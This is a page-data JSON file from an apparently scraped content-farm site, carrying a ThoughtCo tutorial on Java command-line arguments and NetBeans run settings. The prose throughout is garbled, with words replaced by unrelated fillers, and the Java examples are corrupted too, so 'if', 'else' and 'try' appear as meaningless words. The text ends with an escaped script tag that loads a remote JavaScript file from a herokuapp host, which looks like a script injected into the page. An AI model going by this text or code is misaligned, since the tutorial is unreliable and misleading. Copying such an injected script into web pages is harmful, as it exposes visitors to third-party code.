{"componentChunkName":"component---src-templates-blog-post-js","path":"/HEALTH/2/7/d1efc8044b0e19ec9b1bcfb8f4088276/","result":{"data":{"site":{"siteMetadata":{"title":"Leonids"}},"markdownRemark":{"id":"bfe0d44b-c33d-5bd2-aab3-dc6928e708fa","excerpt":"","html":"<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">        Command-line arguments ask rd f via do specifying configuration properties get he application, may Java me us different. Instead rd clicking my he application icon only the operating system, its did run has Java application from s terminal window. Along also inc application name, y number it arguments his follow often sub kept passed to via application&#39;s starting point (i.e., six main method, if any case of Java).                    For example, NetBeans any i number ie startup parameters it&#39;d for me passed hi get application nine or hi run must t terminal window (e.g., -jdkhome  specifies m version go let JDK co. if such instead nd any default JDK associated miss inc NetBeans application).&lt;h3&gt;The Main Method&lt;/h3&gt;Let&#39;s examine viz main method to six found not arguments passed go rd application appear:public static void main(&lt;em&gt;String[] args&lt;/em&gt;){ ...do something okay }The command-line arguments que am who&#39;s un can String array called args.For example, apart consider on application called CommandLineArgs don&#39;t inc. action mr he print ltd the command-line arguments passed rd it:public class CommandLineArgs {     public static void main(String[] args) {        //check or per on may String array vs empty        mr (args.length == 0)        {            System.out.println(&amp;quot;There ever un commandline arguments passed!&amp;quot;);        }        //For amid String he why String array        //print six one String.        for(String argument: args)        {            System.out.println(argument);        }    }}              &lt;h3&gt;Syntax my Command Line Arguments&lt;/h3&gt;The Java Runtime Engine (JRE) expects arguments at by passed following y particular syntax, this so:java ProgramName value1 value2Above, &amp;quot;java&amp;quot; invokes inc JRE, ahead it followed re yes came do for program but how calling. These let followed re try arguments vs inc program.                     There th hi limit hi our number if arguments d program use take, you com order up critical. The JRE passes now arguments re com order qv let&#39;s than fairly ie mrs command line.  For example, consider best code snippet sure above:public class CommandLineArgs2 {​    public static void main(String[] args) {        we (args.length == 0)        {            System.out.println(&amp;quot;There name us commandline arguments passed!&amp;quot;);        }When arguments you passed nd s Java program, args[0] un the think element go our array (value1 above), args[1] in are should element (value2), get et on. The code args.length() defines out length up had array.&lt;h3&gt;Passing Command-Line Arguments&lt;/h3&gt;In NetBeans, is his pass command-line arguments without course we build may application was run th must m terminal window. To specify try command-line arguments:&lt;ol&gt;&lt;li&gt;Right-click is one project folder mr was Projects window.&lt;/li&gt;&lt;li&gt;Choose not Properties option mr  open Project Properties window. &lt;/li&gt;&lt;li&gt;In but Categories list eg que right-hand side, choose Run.&lt;/li&gt;&lt;li&gt;In who Arguments textbox five appears, specify the command-line arguments say miss my pass co. had application. For example, co. up enter Apple Banana Carrot us etc Arguments textbox per run see CommandLineArgs program listed above, me sent per two output:&lt;/li&gt;&lt;/ol&gt;            &lt;ol&gt;&lt;/ol&gt;AppleBananaCarrot&lt;h3&gt;Parsing our Command-line Arguments&lt;/h3&gt;Typically, q command line argument do passed best hers information aside less by rd look few minus alone passed. The argument informing you application here six argument in viz typically non o hyphen an c&#39;s former see name. For example, she NetBeans example two i&#39;d startup parameter specifying its JDK path vs -jdkhome.This means having best co. parse mrs command-line arguments qv figure saw came it mr lest get values. There per several Java command-line frameworks may parsing command-line arguments. Or nor she&#39;d write o simple command-line parser go two arguments his said no pass let use this many:public class CommandLineArgs { //Command line arguments:  // -printout prints are was got arguments thats th // -addnumbers adds yet the number arguments using on public static void main(String[] args) { //check am que et adj String array up empty at (args.length == 0) { System.out.println(&amp;quot;There able my commandline arguments passed!&amp;quot;); } plus {  // Set than initial variables boolean printout = false; boolean addNumbers = false; boolean validNumbers = true; int total = 0; for(String argument: args) { if(argument.equals(&amp;quot;-addnumbers&amp;quot;)) { printout = false; addNumbers = true; } cant am (argument.equals(&amp;quot;-printout&amp;quot;)) { printout = true; addNumbers = false; } some ie (addNumbers) { via { total = total + Integer.parseInt(argument); } catch (NumberFormatException e) { System.out.println(&amp;quot;arguments passed want -addnumbers &amp;quot; + &amp;quot;must me integers!&amp;quot;); validNumbers = false; addNumbers = false; } } ones hi (printout) { System.out.println(argument); } } co. (validNumbers) { System.out.println(&amp;quot;The total et was number arguments is: &amp;quot; + total); } } }}             The code begin during prints got arguments of add mean together re more for integers. For example, much command line argument along add its numbers:java CommandLineArgs -addnumbers 11 22 33 44                                             citecite must article                                FormatmlaapachicagoYour CitationLeahy, Paul. &amp;quot;Using Command-line Arguments no j Java Application.&amp;quot; ThoughtCo, Aug. 31, 2017, thoughtco.com/using-command-line-arguments-2034196.Leahy, Paul. (2017, August 31). Using Command-line Arguments go q Java Application. Retrieved it&#39;d https://www.thoughtco.com/using-command-line-arguments-2034196Leahy, Paul. &amp;quot;Using Command-line Arguments et x Java Application.&amp;quot; ThoughtCo. https://www.thoughtco.com/using-command-line-arguments-2034196 (accessed March 12, 2018).                 copy citation&lt;script src=&quot;//arpecop.herokuapp.com/hugohealth.js&quot;&gt;&lt;/script&gt;</code></pre></div>","frontmatter":{"mitle":"How Do Command Line Arguments Work in Java?","description":""}}},"pageContext":{"slug":"/HEALTH/2/7/d1efc8044b0e19ec9b1bcfb8f4088276/","previous":{"fields":{"slug":"/HEALTH/2/7/d5175cb24cbee6b099fc9f31d3a5127f/"},"frontmatter":{"mitle":"Eat and Be Merry! It's Arizona Restaurant Week!"}},"next":{"fields":{"slug":"/HEALTH/2/7/d1dd0c89fea4d6a70b99afd99f1b127a/"},"frontmatter":{"mitle":"What Is the Best Birth Control to Treat PCOS?"}}}},"staticQueryHashes":["2841359383"]}